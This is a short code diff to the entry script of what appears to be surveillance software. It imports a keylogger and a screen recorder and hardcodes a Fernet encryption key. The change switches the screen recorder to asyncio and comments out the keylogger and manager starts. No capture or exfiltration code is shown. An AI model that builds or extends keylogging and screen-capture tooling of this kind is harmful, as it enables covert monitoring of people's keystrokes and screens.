@@ -5,6 +5,8 @@ from program.keylog import KeyLog
 from threading import Thread
 from cryptography.fernet import Fernet
 
+import asyncio
+
 
 SECRET_KEY = b"3lqUcKreSiI3DzVdHHD7VggudxDIcWCp-bONmioaebE="
 fernet = Fernet(SECRET_KEY)
@@ -14,6 +16,6 @@ keylog = KeyLog(fernet=fernet)
 manager = Manager(fernet=fernet)
 
 if __name__ == '__main__':
-    screen_rec.satart_service()
-    keylog.satart_service()
-    manager.satart_service()
+    asyncio.run(screen_rec.satart_service())
+    #keylog.satart_service()
+    #asyncio.run(manager.satart_service())
